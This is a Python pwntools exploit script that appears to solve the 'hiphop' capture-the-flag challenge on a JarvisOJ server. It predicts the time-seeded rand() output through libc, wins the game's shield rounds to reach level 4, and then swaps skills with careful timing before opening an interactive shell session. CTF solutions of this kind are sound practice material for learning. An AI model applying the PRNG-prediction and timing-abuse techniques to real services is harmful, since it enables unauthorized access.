#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from ctypes import CDLL
from time import sleep
import sys

context.binary = "./hiphop"
context.log_level = "debug"
dll = CDLL("./libc-2.19.so")
dll.srand(dll.time(0))

if sys.argv[1] == "l":
    io = process("./hiphop")
else:
    io = remote("pwn2.jarvisoj.com", 9894)

def defence(num):
    if num % 4 == 0:
        return '1'
    elif num % 4 == 1:
        return '3'
    else:
        return '2'

def use_skill(skill, wait):
    if skill == 2 or skill == 3:
        dll.rand()
    elif skill == 7:
        [dll.rand() for i in xrange(3)]

    io.sendline('2')
    if wait:
        sleep(0.01)
    else:
        io.recvuntil("select shield")
        sleep(0.1)
    io.sendline(defence(dll.rand()))

    if 'level:4\n' in io.recvuntil("6. Exit\n"):
        return True
    else:
        return False

def change_skill(idx):
    io.sendline("3")
    io.recvuntil("9. hollylight")
    io.sendline(str(idx))
    io.recvuntil("6. Exit")

if __name__ == "__main__":
    change_skill(3)
    while not use_skill(3, True): pass
    success("Level 4 reached!")
    #  pause()

    for i in xrange(2):
        change_skill(2)
        use_skill(2, False)
        change_skill(7)
        use_skill(7, False)
        sleep(1)

    io.interactive()
    



